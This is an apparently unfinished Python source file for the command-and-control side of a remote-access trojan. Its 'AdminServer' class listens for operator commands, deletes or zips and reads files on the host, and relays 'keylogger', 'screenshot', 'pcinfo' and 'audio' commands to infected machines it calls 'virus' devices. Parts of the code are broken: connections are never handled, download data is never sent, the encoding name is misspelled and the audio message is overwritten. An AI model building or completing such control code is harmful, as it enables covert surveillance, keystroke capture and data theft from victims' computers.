import socket
import os, shutil
from os.path import join


import server


class AdminServer:
    def __init__(self,server):
        self.msg = None
        self.viruses_server = server
        PORT = 5055
        SERVER = socket.gethostbyname(socket.gethostname())
        ADDR = (SERVER, PORT)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(ADDR)
        self.sock.listen()
        while True:
            conn, addr = self.sock.accept()

    def handle_admin(self,conn):
        while True:
            msg = conn.recv(2048).decode()
            self.handle_message(msg)

    def handle_message(self,msg):
        self.msg = msg
        if self.is_self_action():
            self.self_action()
        else:
            self.send_to_virus()


    def is_self_action(self):
        if "download" in self.msg:
            return True
        elif "delete" in self.msg:
            return True
        elif "getfolders" in self.msg:
            return True
        elif "getfiles" in self.msg:
            return True
        else:
            return False


    def self_action(self):
        if "delete" in self.msg:       # DELETE
            path = self.msg[6:]
            # We identify between a file and a folder by the dot if we have dot in [-4] it file
            if path[-4] == ".":
                os.remove(path)
            # else = folder
            else:
                shutil.rmtree(path)
        elif "download" in self.msg:    # DOWNLOAD
            path = self.msg[8:]
            if path[-4] != ".":  # when it's a folder, create a zip file
                shutil.make_archive(path, 'zip', path)
                path += '.zip'
            with open(path, 'rb') as file:
                data = file.read()
        elif "getfolders" == self.msg:
            path = ".\\"
            folder_names = [f for f in os.listdir(path) if not os.path.isfile(join(path, f))]
            data = ""
            for folder in folder_names:
                data += " " + folder

        elif "getfiles" in self.msg:
            path = self.msg[8:]
            file_names = [f for f in os.listdir(path) if os.path.isfile(join(path, f))]
            data = ""
            for file in file_names:
                data += " " + file
        else:
            print("something went wrong")



    def send_to_virus(self):
         # Identification of the request
        if "screenshot" in self.msg:
            pass
        elif "pcinfo" in self.msg:
            pass
        elif "keylogger" in self.msg:
            pass
        elif "audio" in self.msg:
            addr = self.msg.split("audio")[-1]
            virus_socket = self.viruses_server.virus_devices[addr]
            msg_to_virus = "audio".encode("uft-8")
            msg_to_virus = b' ' * (2048-len(msg_to_virus))
            virus_socket.send(msg_to_virus)
        else:
            print("something went wrong")